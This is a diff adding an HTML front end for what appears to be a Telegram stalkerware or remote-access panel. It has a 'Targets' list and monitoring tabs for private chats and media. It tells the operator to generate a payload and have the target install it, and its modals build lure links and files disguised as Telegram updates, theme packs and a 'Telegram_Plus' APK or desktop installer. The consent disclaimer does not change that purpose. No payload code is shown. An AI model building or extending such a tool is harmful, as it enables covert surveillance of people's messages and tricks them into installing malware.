@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Surveillance Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="warning-banner">
+        <i class="fas fa-exclamation-triangle"></i>
+         DISCLAIMER - Telegram monitoring without someone consent is illegal
+    </div>
+    
+    <div class="dashboard-container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h2><i class="fab fa-telegram"></i> Telegram Panel</h2>
+                <a href="dashboard.html" class="back-btn">
+                    <i class="fas fa-arrow-left"></i> Dashboard
+                </a>
+            </div>
+            
+            <div class="sidebar-menu">
+                <div class="menu-section">
+                    <h3><i class="fas fa-eye"></i> Monitoring</h3>
+                    <a href="#" class="menu-item active" data-tab="chats">
+                        <i class="fas fa-comments"></i> Chats
+                    </a>
+                    <a href="#" class="menu-item" data-tab="channels">
+                        <i class="fas fa-broadcast-tower"></i> Channels
+                    </a>
+                    <a href="#" class="menu-item" data-tab="groups">
+                        <i class="fas fa-users"></i> Groups
+                    </a>
+                    <a href="#" class="menu-item" data-tab="media">
+                        <i class="fas fa-file"></i> Media & Files
+                    </a>
+                </div>
+                
+                <div class="menu-section">
+                    <h3><i class="fas fa-cogs"></i> Tools</h3>
+                    <a href="#" class="menu-item" id="tg-generate-link">
+                        <i class="fas fa-link"></i> Generate Link
+                    </a>
+                    <a href="#" class="menu-item" id="tg-generate-file">
+                        <i class="fas fa-file-download"></i> Generate File
+                    </a>
+                    <a href="#" class="menu-item" data-tab="settings">
+                        <i class="fas fa-sliders-h"></i> Settings
+                    </a>
+                </div>
+                
+                <div class="menu-section">
+                    <h3><i class="fas fa-users"></i> Targets</h3>
+                    <div class="targets-list" id="tg-targets-list">
+                        <!-- Targets will be loaded here -->
+                    </div>
+                </div>
+            </div>
+            
+            <div class="sidebar-footer">
+                <div class="connection-status">
+                    <i class="fas fa-circle status-offline"></i>
+                    <span>Connected: <strong id="tg-connected-targets">0</strong> targets</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="content-header">
+                <h1><i class="fab fa-telegram"></i> Telegram Surveillance</h1>
+                <div class="header-actions">
+                    <button class="btn-refresh" id="tg-refresh">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                    <button class="btn-add-target" id="tg-add-target">
+                        <i class="fas fa-plus"></i> Add Target
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Tab Content -->
+            <div class="tab-content active" id="chats-tab">
+                <div class="telegram-container">
+                    <div class="chat-list-container">
+                        <h3><i class="fas fa-comments"></i> Telegram Chats</h3>
+                        <div class="telegram-chats" id="tg-chats">
+                            <!-- Telegram chats will be loaded here -->
+                        </div>
+                    </div>
+                    
+                    <div class="connection-status-panel">
+                        <div class="status-message">
+                            <i class="fas fa-plug"></i>
+                            <h4>Telegram Module Not Connected</h4>
+                            <p>To monitor Telegram, generate a payload and have the target install it.</p>
+                            <button class="btn-connect" id="tg-connect-btn">
+                                <i class="fas fa-bolt"></i> Generate Connection Payload
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Generated Items Panel -->
+            <div class="generated-panel">
+                <h3><i class="fas fa-code"></i> Generated Items</h3>
+                <div class="generated-items-list" id="tg-generated-items">
+                    <!-- Generated Telegram items -->
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Telegram Link Generator Modal -->
+    <div class="modal" id="tg-link-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fab fa-telegram"></i> Generate Telegram Link</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label>Link Type</label>
+                    <select id="tg-link-type">
+                        <option value="update">Telegram Update</option>
+                        <option value="theme">Theme Pack</option>
+                        <option value="bot">Bot Integration</option>
+                        <option value="tool">Telegram Tool</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Target Device</label>
+                    <select id="tg-target-device">
+                        <option value="android">Android</option>
+                        <option value="ios">iPhone</option>
+                        <option value="pc">Desktop</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Link Name</label>
+                    <input type="text" id="tg-link-name" placeholder="Telegram Update" value="Telegram Plus Update">
+                </div>
+                <div class="form-actions">
+                    <button class="btn-generate" id="tg-generate-link-btn">
+                        <i class="fas fa-bolt"></i> Generate Link
+                    </button>
+                    <button class="btn-copy" id="tg-copy-link">
+                        <i class="fas fa-copy"></i> Copy Link
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Telegram File Generator Modal -->
+    <div class="modal" id="tg-file-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fab fa-telegram"></i> Generate Telegram File</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label>File Type</label>
+                    <select id="tg-file-type">
+                        <option value="apk">Telegram Plus APK</option>
+                        <option value="exe">Telegram Desktop</option>
+                        <option value="zip">Theme Pack</option>
+                        <option value="pdf">User Guide</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>File Name</label>
+                    <input type="text" id="tg-file-name" placeholder="Telegram_Plus.apk" value="Telegram_Plus_v8.5.apk">
+                </div>
+                <div class="form-group">
+                    <label>File Size (MB)</label>
+                    <input type="range" id="tg-file-size" min="1" max="100" value="65">
+                    <span id="tg-size-value">65 MB</span>
+                </div>
+                <div class="form-actions">
+                    <button class="btn-generate" id="tg-generate-file-btn">
+                        <i class="fas fa-bolt"></i> Generate File
+                    </button>
+                    <button class="btn-download" id="tg-download-file">
+                        <i class="fas fa-download"></i> Download File
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="platform.js"></script>
+    <script>
+        // Telegram specific initialization
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeTelegramPanel();
+        });
+    </script>
+</body>
+</html>
